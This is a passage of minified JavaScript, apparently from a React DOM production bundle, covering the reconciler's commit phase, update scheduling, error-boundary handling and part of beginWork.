fe(n),null;if(s=(n.flags&128)!==0,o=r.rendering,o===null)if(s)Ut(r,!1);else{if(re!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(o=Ea(e),o!==null){for(n.flags|=128,Ut(r,!1),s=o.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)r=t,e=s,r.flags&=14680066,o=r.alternate,o===null?(r.childLanes=0,r.lanes=e,r.child=null,r.subtreeFlags=0,r.memoizedProps=null,r.memoizedState=null,r.updateQueue=null,r.dependencies=null,r.stateNode=null):(r.childLanes=o.childLanes,r.lanes=o.lanes,r.child=o.child,r.subtreeFlags=0,r.deletions=null,r.memoizedProps=o.memoizedProps,r.memoizedState=o.memoizedState,r.updateQueue=o.updateQueue,r.type=o.type,e=o.dependencies,r.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return W(Q,Q.current&1|2),n.child}e=e.sibling}r.tail!==null&&te()>jt&&(n.flags|=128,s=!0,Ut(r,!1),n.lanes=4194304)}else{if(!s)if(e=Ea(o),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),Ut(r,!0),r.tail===null&&r.tailMode==="hidden"&&!o.alternate&&!Y)return fe(n),null}else 2*te()-r.renderingStartTime>jt&&t!==1073741824&&(n.flags|=128,s=!0,Ut(r,!1),n.lanes=4194304);r.isBackwards?(o.sibling=n.child,n.child=o):(t=r.last,t!==null?t.sibling=o:n.child=o,r.last=o)}return r.tail!==null?(n=r.tail,r.rendering=n,r.tail=n.sibling,r.renderingStartTime=te(),n.sibling=null,t=Q.current,W(Q,s?t&1|2:t&1),n):(fe(n),null);case 22:case 23:return ko(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?Ae&1073741824&&(fe(n),n.subtreeFlags&6&&(n.flags|=8192)):fe(n),null;case 24:return null;case 25:return null}throw Error(j(156,n.tag))}function Sm(e,n){switch(eo(n),n.tag){case 1:return je(n.type)&&ya(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Nt(),G(Ce),G(ve),co(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return lo(n),null;case 13:if(G(Q),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(j(340));Et()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return G(Q),null;case 4:return Nt(),null;case 10:return ao(n.type._context),null;case 22:case 23:return ko(),null;case 24:return null;default:return null}}var Bs=!1,ge=!1,Tm=typeof WeakSet=="function"?WeakSet:Set,A=null;function ht(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){ne(e,n,s)}else t.current=null}function bi(e,n,t){try{t()}catch(s){ne(e,n,s)}}var Bl=!1;function Em(e,n){if(si=ma,e=Eu(),Ji(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var a=s.anchorOffset,r=s.focusNode;s=s.focusOffset;try{t.nodeType,r.nodeType}catch{t=null;break e}var o=0,l=-1,c=-1,d=0,m=0,p=e,v=null;n:for(;;){for(var b;p!==t||a!==0&&p.nodeType!==3||(l=o+a),p!==r||s!==0&&p.nodeType!==3||(c=o+s),p.nodeType===3&&(o+=p.nodeValue.length),(b=p.firstChild)!==null;)v=p,p=b;for(;;){if(p===e)break n;if(v===t&&++d===a&&(l=o),v===r&&++m===s&&(c=o),(b=p.nextSibling)!==null)break;p=v,v=p.parentNode}p=b}t=l===-1||c===-1?null:{start:l,end:c}}else t=null}t=t||{start:0,end:0}}else t=null;for(ai={focusedElem:e,selectionRange:t},ma=!1,A=n;A!==null;)if(n=A,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,A=e;else for(;A!==null;){n=A;try{var w=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(w!==null){var y=w.memoizedProps,T=w.memoizedState,f=n.stateNode,u=f.getSnapshotBeforeUpdate(n.elementType===n.type?y:We(n.type,y),T);f.__reactInternalSnapshotBeforeUpdate=u}break;case 3:var h=n.stateNode.containerInfo;h.nodeType===1?h.textContent="":h.nodeType===9&&h.documentElement&&h.removeChild(h.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(j(163))}}catch(x){ne(n,n.return,x)}if(e=n.sibling,e!==null){e.return=n.return,A=e;break}A=n.return}return w=Bl,Bl=!1,w}function ns(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var a=s=s.next;do{if((a.tag&e)===e){var r=a.destroy;a.destroy=void 0,r!==void 0&&bi(n,t,r)}a=a.next}while(a!==s)}}function Ha(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function ki(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function kd(e){var n=e.alternate;n!==null&&(e.alternate=null,kd(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[nn],delete n[ms],delete n[oi],delete n[om],delete n[lm])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function xd(e){return e.tag===5||e.tag===3||e.tag===4}function Hl(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||xd(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function xi(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=va));else if(s!==4&&(e=e.child,e!==null))for(xi(e,n,t),e=e.sibling;e!==null;)xi(e,n,t),e=e.sibling}function Si(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Si(e,n,t),e=e.sibling;e!==null;)Si(e,n,t),e=e.sibling}var de=null,Ve=!1;function vn(e,n,t){for(t=t.child;t!==null;)Sd(e,n,t),t=t.sibling}function Sd(e,n,t){if(tn&&typeof tn.onCommitFiberUnmount=="function")try{tn.onCommitFiberUnmount(Ra,t)}catch{}switch(t.tag){case 5:ge||ht(t,n);case 6:var s=de,a=Ve;de=null,vn(e,n,t),de=s,Ve=a,de!==null&&(Ve?(e=de,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):de.removeChild(t.stateNode));break;case 18:de!==null&&(Ve?(e=de,t=t.stateNode,e.nodeType===8?vr(e.parentNode,t):e.nodeType===1&&vr(e,t),cs(e)):vr(de,t.stateNode));break;case 4:s=de,a=Ve,de=t.stateNode.containerInfo,Ve=!0,vn(e,n,t),de=s,Ve=a;break;case 0:case 11:case 14:case 15:if(!ge&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){a=s=s.next;do{var r=a,o=r.destroy;r=r.tag,o!==void 0&&(r&2||r&4)&&bi(t,n,o),a=a.next}while(a!==s)}vn(e,n,t);break;case 1:if(!ge&&(ht(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){ne(t,n,l)}vn(e,n,t);break;case 21:vn(e,n,t);break;case 22:t.mode&1?(ge=(s=ge)||t.memoizedState!==null,vn(e,n,t),ge=s):vn(e,n,t);break;default:vn(e,n,t)}}function $l(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new Tm),n.forEach(function(s){var a=Mm.bind(null,e,s);t.has(s)||(t.add(s),s.then(a,a))})}}function $e(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var a=t[s];try{var r=e,o=n,l=o;e:for(;l!==null;){switch(l.tag){case 5:de=l.stateNode,Ve=!1;break e;case 3:de=l.stateNode.containerInfo,Ve=!0;break e;case 4:de=l.stateNode.containerInfo,Ve=!0;break e}l=l.return}if(de===null)throw Error(j(160));Sd(r,o,a),de=null,Ve=!1;var c=a.alternate;c!==null&&(c.return=null),a.return=null}catch(d){ne(a,n,d)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)Td(n,e),n=n.sibling}function Td(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if($e(n,e),Ze(e),s&4){try{ns(3,e,e.return),Ha(3,e)}catch(y){ne(e,e.return,y)}try{ns(5,e,e.return)}catch(y){ne(e,e.return,y)}}break;case 1:$e(n,e),Ze(e),s&512&&t!==null&&ht(t,t.return);break;case 5:if($e(n,e),Ze(e),s&512&&t!==null&&ht(t,t.return),e.flags&32){var a=e.stateNode;try{rs(a,"")}catch(y){ne(e,e.return,y)}}if(s&4&&(a=e.stateNode,a!=null)){var r=e.memoizedProps,o=t!==null?t.memoizedProps:r,l=e.type,c=e.updateQueue;if(e.updateQueue=null,c!==null)try{l==="input"&&r.type==="radio"&&r.name!=null&&Vc(a,r),Gr(l,o);var d=Gr(l,r);for(o=0;o<c.length;o+=2){var m=c[o],p=c[o+1];m==="style"?Qc(a,p):m==="dangerouslySetInnerHTML"?Yc(a,p):m==="children"?rs(a,p):zi(a,m,p,d)}switch(l){case"input":Br(a,r);break;case"textarea":Gc(a,r);break;case"select":var v=a._wrapperState.wasMultiple;a._wrapperState.wasMultiple=!!r.multiple;var b=r.value;b!=null?gt(a,!!r.multiple,b,!1):v!==!!r.multiple&&(r.defaultValue!=null?gt(a,!!r.multiple,r.defaultValue,!0):gt(a,!!r.multiple,r.multiple?[]:"",!1))}a[ms]=r}catch(y){ne(e,e.return,y)}}break;case 6:if($e(n,e),Ze(e),s&4){if(e.stateNode===null)throw Error(j(162));a=e.stateNode,r=e.memoizedProps;try{a.nodeValue=r}catch(y){ne(e,e.return,y)}}break;case 3:if($e(n,e),Ze(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{cs(n.containerInfo)}catch(y){ne(e,e.return,y)}break;case 4:$e(n,e),Ze(e);break;case 13:$e(n,e),Ze(e),a=e.child,a.flags&8192&&(r=a.memoizedState!==null,a.stateNode.isHidden=r,!r||a.alternate!==null&&a.alternate.memoizedState!==null||(wo=te())),s&4&&$l(e);break;case 22:if(m=t!==null&&t.memoizedState!==null,e.mode&1?(ge=(d=ge)||m,$e(n,e),ge=d):$e(n,e),Ze(e),s&8192){if(d=e.memoizedState!==null,(e.stateNode.isHidden=d)&&!m&&e.mode&1)for(A=e,m=e.child;m!==null;){for(p=A=m;A!==null;){switch(v=A,b=v.child,v.tag){case 0:case 11:case 14:case 15:ns(4,v,v.return);break;case 1:ht(v,v.return);var w=v.stateNode;if(typeof w.componentWillUnmount=="function"){s=v,t=v.return;try{n=s,w.props=n.memoizedProps,w.state=n.memoizedState,w.componentWillUnmount()}catch(y){ne(s,t,y)}}break;case 5:ht(v,v.return);break;case 22:if(v.memoizedState!==null){Vl(p);continue}}b!==null?(b.return=v,A=b):Vl(p)}m=m.sibling}e:for(m=null,p=e;;){if(p.tag===5){if(m===null){m=p;try{a=p.stateNode,d?(r=a.style,typeof r.setProperty=="function"?r.setProperty("display","none","important"):r.display="none"):(l=p.stateNode,c=p.memoizedProps.style,o=c!=null&&c.hasOwnProperty("display")?c.display:null,l.style.display=Xc("display",o))}catch(y){ne(e,e.return,y)}}}else if(p.tag===6){if(m===null)try{p.stateNode.nodeValue=d?"":p.memoizedProps}catch(y){ne(e,e.return,y)}}else if((p.tag!==22&&p.tag!==23||p.memoizedState===null||p===e)&&p.child!==null){p.child.return=p,p=p.child;continue}if(p===e)break e;for(;p.sibling===null;){if(p.return===null||p.return===e)break e;m===p&&(m=null),p=p.return}m===p&&(m=null),p.sibling.return=p.return,p=p.sibling}}break;case 19:$e(n,e),Ze(e),s&4&&$l(e);break;case 21:break;default:$e(n,e),Ze(e)}}function Ze(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(xd(t)){var s=t;break e}t=t.return}throw Error(j(160))}switch(s.tag){case 5:var a=s.stateNode;s.flags&32&&(rs(a,""),s.flags&=-33);var r=Hl(e);Si(e,r,a);break;case 3:case 4:var o=s.stateNode.containerInfo,l=Hl(e);xi(e,l,o);break;default:throw Error(j(161))}}catch(c){ne(e,e.return,c)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function _m(e,n,t){A=e,Ed(e)}function Ed(e,n,t){for(var s=(e.mode&1)!==0;A!==null;){var a=A,r=a.child;if(a.tag===22&&s){var o=a.memoizedState!==null||Bs;if(!o){var l=a.alternate,c=l!==null&&l.memoizedState!==null||ge;l=Bs;var d=ge;if(Bs=o,(ge=c)&&!d)for(A=a;A!==null;)o=A,c=o.child,o.tag===22&&o.memoizedState!==null?Gl(a):c!==null?(c.return=o,A=c):Gl(a);for(;r!==null;)A=r,Ed(r),r=r.sibling;A=a,Bs=l,ge=d}Wl(e)}else a.subtreeFlags&8772&&r!==null?(r.return=a,A=r):Wl(e)}}function Wl(e){for(;A!==null;){var n=A;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:ge||Ha(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!ge)if(t===null)s.componentDidMount();else{var a=n.elementType===n.type?t.memoizedProps:We(n.type,t.memoizedProps);s.componentDidUpdate(a,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var r=n.updateQueue;r!==null&&jl(n,r,s);break;case 3:var o=n.updateQueue;if(o!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}jl(n,o,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var c=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":c.autoFocus&&t.focus();break;case"img":c.src&&(t.src=c.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var d=n.alternate;if(d!==null){var m=d.memoizedState;if(m!==null){var p=m.dehydrated;p!==null&&cs(p)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(j(163))}ge||n.flags&512&&ki(n)}catch(v){ne(n,n.return,v)}}if(n===e){A=null;break}if(t=n.sibling,t!==null){t.return=n.return,A=t;break}A=n.return}}function Vl(e){for(;A!==null;){var n=A;if(n===e){A=null;break}var t=n.sibling;if(t!==null){t.return=n.return,A=t;break}A=n.return}}function Gl(e){for(;A!==null;){var n=A;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{Ha(4,n)}catch(c){ne(n,t,c)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var a=n.return;try{s.componentDidMount()}catch(c){ne(n,a,c)}}var r=n.return;try{ki(n)}catch(c){ne(n,r,c)}break;case 5:var o=n.return;try{ki(n)}catch(c){ne(n,o,c)}}}catch(c){ne(n,n.return,c)}if(n===e){A=null;break}var l=n.sibling;if(l!==null){l.return=n.return,A=l;break}A=n.return}}var Nm=Math.ceil,Ca=gn.ReactCurrentDispatcher,vo=gn.ReactCurrentOwner,Ue=gn.ReactCurrentBatchConfig,F=0,ce=null,se=null,pe=0,Ae=0,mt=Dn(0),re=0,bs=null,Qn=0,$a=0,yo=0,ts=null,Ee=null,wo=0,jt=1/0,rn=null,ja=!1,Ti=null,An=null,Hs=!1,Tn=null,La=0,ss=0,Ei=null,aa=-1,ra=0;function xe(){return F&6?te():aa!==-1?aa:aa=te()}function Pn(e){return e.mode&1?F&2&&pe!==0?pe&-pe:um.transition!==null?(ra===0&&(ra=cu()),ra):(e=$,e!==0||(e=window.event,e=e===void 0?16:gu(e.type)),e):1}function Qe(e,n,t,s){if(50<ss)throw ss=0,Ei=null,Error(j(185));Ts(e,t,s),(!(F&2)||e!==ce)&&(e===ce&&(!(F&2)&&($a|=t),re===4&&xn(e,pe)),Le(e,s),t===1&&F===0&&!(n.mode&1)&&(jt=te()+500,Fa&&zn()))}function Le(e,n){var t=e.callbackNode;uh(e,n);var s=ha(e,e===ce?pe:0);if(s===0)t!==null&&tl(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&tl(t),n===1)e.tag===0?cm(Kl.bind(null,e)):Ru(Kl.bind(null,e)),rm(function(){!(F&6)&&zn()}),t=null;else{switch(uu(s)){case 1:t=$i;break;case 4:t=ou;break;case 16:t=pa;break;case 536870912:t=lu;break;default:t=pa}t=Id(t,_d.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function _d(e,n){if(aa=-1,ra=0,F&6)throw Error(j(327));var t=e.callbackNode;if(kt()&&e.callbackNode!==t)return null;var s=ha(e,e===ce?pe:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=Aa(e,s);else{n=s;var a=F;F|=2;var r=Cd();(ce!==e||pe!==n)&&(rn=null,jt=te()+500,Wn(e,n));do try{Lm();break}catch(l){Nd(e,l)}while(!0);so(),Ca.current=r,F=a,se!==null?n=0:(ce=null,pe=0,n=re)}if(n!==0){if(n===2&&(a=Jr(e),a!==0&&(s=a,n=_i(e,a))),n===1)throw t=bs,Wn(e,0),xn(e,s),Le(e,te()),t;if(n===6)xn(e,s);else{if(a=e.current.alternate,!(s&30)&&!Cm(a)&&(n=Aa(e,s),n===2&&(r=Jr(e),r!==0&&(s=r,n=_i(e,r))),n===1))throw t=bs,Wn(e,0),xn(e,s),Le(e,te()),t;switch(e.finishedWork=a,e.finishedLanes=s,n){case 0:case 1:throw Error(j(345));case 2:Un(e,Ee,rn);break;case 3:if(xn(e,s),(s&130023424)===s&&(n=wo+500-te(),10<n)){if(ha(e,0)!==0)break;if(a=e.suspendedLanes,(a&s)!==s){xe(),e.pingedLanes|=e.suspendedLanes&a;break}e.timeoutHandle=ii(Un.bind(null,e,Ee,rn),n);break}Un(e,Ee,rn);break;case 4:if(xn(e,s),(s&4194240)===s)break;for(n=e.eventTimes,a=-1;0<s;){var o=31-Xe(s);r=1<<o,o=n[o],o>a&&(a=o),s&=~r}if(s=a,s=te()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*Nm(s/1960))-s,10<s){e.timeoutHandle=ii(Un.bind(null,e,Ee,rn),s);break}Un(e,Ee,rn);break;case 5:Un(e,Ee,rn);break;default:throw Error(j(329))}}}return Le(e,te()),e.callbackNode===t?_d.bind(null,e):null}function _i(e,n){var t=ts;return e.current.memoizedState.isDehydrated&&(Wn(e,n).flags|=256),e=Aa(e,n),e!==2&&(n=Ee,Ee=t,n!==null&&Ni(n)),e}function Ni(e){Ee===null?Ee=e:Ee.push.apply(Ee,e)}function Cm(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var a=t[s],r=a.getSnapshot;a=a.value;try{if(!Je(r(),a))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function xn(e,n){for(n&=~yo,n&=~$a,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Xe(n),s=1<<t;e[t]=-1,n&=~s}}function Kl(e){if(F&6)throw Error(j(327));kt();var n=ha(e,0);if(!(n&1))return Le(e,te()),null;var t=Aa(e,n);if(e.tag!==0&&t===2){var s=Jr(e);s!==0&&(n=s,t=_i(e,s))}if(t===1)throw t=bs,Wn(e,0),xn(e,n),Le(e,te()),t;if(t===6)throw Error(j(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Un(e,Ee,rn),Le(e,te()),null}function bo(e,n){var t=F;F|=1;try{return e(n)}finally{F=t,F===0&&(jt=te()+500,Fa&&zn())}}function Jn(e){Tn!==null&&Tn.tag===0&&!(F&6)&&kt();var n=F;F|=1;var t=Ue.transition,s=$;try{if(Ue.transition=null,$=1,e)return e()}finally{$=s,Ue.transition=t,F=n,!(F&6)&&zn()}}function ko(){Ae=mt.current,G(mt)}function Wn(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,am(t)),se!==null)for(t=se.return;t!==null;){var s=t;switch(eo(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&ya();break;case 3:Nt(),G(Ce),G(ve),co();break;case 5:lo(s);break;case 4:Nt();break;case 13:G(Q);break;case 19:G(Q);break;case 10:ao(s.type._context);break;case 22:case 23:ko()}t=t.return}if(ce=e,se=e=In(e.current,null),pe=Ae=n,re=0,bs=null,yo=$a=Qn=0,Ee=ts=null,Hn!==null){for(n=0;n<Hn.length;n++)if(t=Hn[n],s=t.interleaved,s!==null){t.interleaved=null;var a=s.next,r=t.pending;if(r!==null){var o=r.next;r.next=a,s.next=o}t.pending=s}Hn=null}return e}function Nd(e,n){do{var t=se;try{if(so(),na.current=Na,_a){for(var s=J.memoizedState;s!==null;){var a=s.queue;a!==null&&(a.pending=null),s=s.next}_a=!1}if(Xn=0,oe=ae=J=null,es=!1,vs=0,vo.current=null,t===null||t.return===null){re=1,bs=n,se=null;break}e:{var r=e,o=t.return,l=t,c=n;if(n=pe,l.flags|=32768,c!==null&&typeof c=="object"&&typeof c.then=="function"){var d=c,m=l,p=m.tag;if(!(m.mode&1)&&(p===0||p===11||p===15)){var v=m.alternate;v?(m.updateQueue=v.updateQueue,m.memoizedState=v.memoizedState,m.lanes=v.lanes):(m.updateQueue=null,m.memoizedState=null)}var b=Rl(o);if(b!==null){b.flags&=-257,Ol(b,o,l,r,n),b.mode&1&&Ml(r,d,n),n=b,c=d;var w=n.updateQueue;if(w===null){var y=new Set;y.add(c),n.updateQueue=y}else w.add(c);break e}else{if(!(n&1)){Ml(r,d,n),xo();break e}c=Error(j(426))}}else if(Y&&l.mode&1){var T=Rl(o);if(T!==null){!(T.flags&65536)&&(T.flags|=256),Ol(T,o,l,r,n),no(Ct(c,l));break e}}r=c=Ct(c,l),re!==4&&(re=2),ts===null?ts=[r]:ts.push(r),r=o;do{switch(r.tag){case 3:r.flags|=65536,n&=-n,r.lanes|=n;var f=ud(r,c,n);Cl(r,f);break e;case 1:l=c;var u=r.type,h=r.stateNode;if(!(r.flags&128)&&(typeof u.getDerivedStateFromError=="function"||h!==null&&typeof h.componentDidCatch=="function"&&(An===null||!An.has(h)))){r.flags|=65536,n&=-n,r.lanes|=n;var x=dd(r,l,n);Cl(r,x);break e}}r=r.return}while(r!==null)}Ld(t)}catch(k){n=k,se===t&&t!==null&&(se=t=t.return);continue}break}while(!0)}function Cd(){var e=Ca.current;return Ca.current=Na,e===null?Na:e}function xo(){(re===0||re===3||re===2)&&(re=4),ce===null||!(Qn&268435455)&&!($a&268435455)||xn(ce,pe)}function Aa(e,n){var t=F;F|=2;var s=Cd();(ce!==e||pe!==n)&&(rn=null,Wn(e,n));do try{jm();break}catch(a){Nd(e,a)}while(!0);if(so(),F=t,Ca.current=s,se!==null)throw Error(j(261));return ce=null,pe=0,re}function jm(){for(;se!==null;)jd(se)}function Lm(){for(;se!==null&&!nh();)jd(se)}function jd(e){var n=Pd(e.alternate,e,Ae);e.memoizedProps=e.pendingProps,n===null?Ld(e):se=n,vo.current=null}function Ld(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=Sm(t,n),t!==null){t.flags&=32767,se=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{re=6,se=null;return}}else if(t=xm(t,n,Ae),t!==null){se=t;return}if(n=n.sibling,n!==null){se=n;return}se=n=e}while(n!==null);re===0&&(re=5)}function Un(e,n,t){var s=$,a=Ue.transition;try{Ue.transition=null,$=1,Am(e,n,t,s)}finally{Ue.transition=a,$=s}return null}function Am(e,n,t,s){do kt();while(Tn!==null);if(F&6)throw Error(j(327));t=e.finishedWork;var a=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(j(177));e.callbackNode=null,e.callbackPriority=0;var r=t.lanes|t.childLanes;if(dh(e,r),e===ce&&(se=ce=null,pe=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||Hs||(Hs=!0,Id(pa,function(){return kt(),null})),r=(t.flags&15990)!==0,t.subtreeFlags&15990||r){r=Ue.transition,Ue.transition=null;var o=$;$=1;var l=F;F|=4,vo.current=null,Em(e,t),Td(t,e),Qh(ai),ma=!!si,ai=si=null,e.current=t,_m(t),th(),F=l,$=o,Ue.transition=r}else e.current=t;if(Hs&&(Hs=!1,Tn=e,La=a),r=e.pendingLanes,r===0&&(An=null),rh(t.stateNode),Le(e,te()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)a=n[t],s(a.value,{componentStack:a.stack,digest:a.digest});if(ja)throw ja=!1,e=Ti,Ti=null,e;return La&1&&e.tag!==0&&kt(),r=e.pendingLanes,r&1?e===Ei?ss++:(ss=0,Ei=e):ss=0,zn(),null}function kt(){if(Tn!==null){var e=uu(La),n=Ue.transition,t=$;try{if(Ue.transition=null,$=16>e?16:e,Tn===null)var s=!1;else{if(e=Tn,Tn=null,La=0,F&6)throw Error(j(331));var a=F;for(F|=4,A=e.current;A!==null;){var r=A,o=r.child;if(A.flags&16){var l=r.deletions;if(l!==null){for(var c=0;c<l.length;c++){var d=l[c];for(A=d;A!==null;){var m=A;switch(m.tag){case 0:case 11:case 15:ns(8,m,r)}var p=m.child;if(p!==null)p.return=m,A=p;else for(;A!==null;){m=A;var v=m.sibling,b=m.return;if(kd(m),m===d){A=null;break}if(v!==null){v.return=b,A=v;break}A=b}}}var w=r.alternate;if(w!==null){var y=w.child;if(y!==null){w.child=null;do{var T=y.sibling;y.sibling=null,y=T}while(y!==null)}}A=r}}if(r.subtreeFlags&2064&&o!==null)o.return=r,A=o;else e:for(;A!==null;){if(r=A,r.flags&2048)switch(r.tag){case 0:case 11:case 15:ns(9,r,r.return)}var f=r.sibling;if(f!==null){f.return=r.return,A=f;break e}A=r.return}}var u=e.current;for(A=u;A!==null;){o=A;var h=o.child;if(o.subtreeFlags&2064&&h!==null)h.return=o,A=h;else e:for(o=u;A!==null;){if(l=A,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:Ha(9,l)}}catch(k){ne(l,l.return,k)}if(l===o){A=null;break e}var x=l.sibling;if(x!==null){x.return=l.return,A=x;break e}A=l.return}}if(F=a,zn(),tn&&typeof tn.onPostCommitFiberRoot=="function")try{tn.onPostCommitFiberRoot(Ra,e)}catch{}s=!0}return s}finally{$=t,Ue.transition=n}}return!1}function Yl(e,n,t){n=Ct(t,n),n=ud(e,n,1),e=Ln(e,n,1),n=xe(),e!==null&&(Ts(e,1,n),Le(e,n))}function ne(e,n,t){if(e.tag===3)Yl(e,e,t);else for(;n!==null;){if(n.tag===3){Yl(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(An===null||!An.has(s))){e=Ct(t,e),e=dd(n,e,1),n=Ln(n,e,1),e=xe(),n!==null&&(Ts(n,1,e),Le(n,e));break}}n=n.return}}function Pm(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=xe(),e.pingedLanes|=e.suspendedLanes&t,ce===e&&(pe&t)===t&&(re===4||re===3&&(pe&130023424)===pe&&500>te()-wo?Wn(e,0):yo|=t),Le(e,n)}function Ad(e,n){n===0&&(e.mode&1?(n=Is,Is<<=1,!(Is&130023424)&&(Is=4194304)):n=1);var t=xe();e=mn(e,n),e!==null&&(Ts(e,n,t),Le(e,t))}function Im(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),Ad(e,t)}function Mm(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,a=e.memoizedState;a!==null&&(t=a.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(j(314))}s!==null&&s.delete(n),Ad(e,t)}var Pd;Pd=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||Ce.current)Ne=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return Ne=!1,km(e,n,t);Ne=!!(e.flags&131072)}else Ne=!1,Y&&n.flags&1048576&&Ou(n,ka,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;sa(e,n),e=n.pendingProps;var a=Tt(n,ve.current);bt(n,t),a=po(null,n,s,e,a,t);var r=ho();return n.flags|=1,typeof a=="object"&&a!==null&&typeof a.render=="function"&&a.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,je(s)?(r=!0,wa(n)):r=!1,n.memoizedState=a.state!==null&&a.state!==void 0?a.state:null,io(n),a.updater=Ba,n.stateNode=a,a._reactInternals=n,hi(n,s,e,t),n=gi(null,n,s,!0,r,t)):(n.tag=0,Y&&r&&Zi(n),be(null,n,a,t),n=n.child),n;case 16:s=n.elementType;e:{switch(sa(e,n),e=n.pendingProps,a=s._init,s=a(s._payload),n.type=s,a=n.tag=Om(s),e=We(s,e),a){case 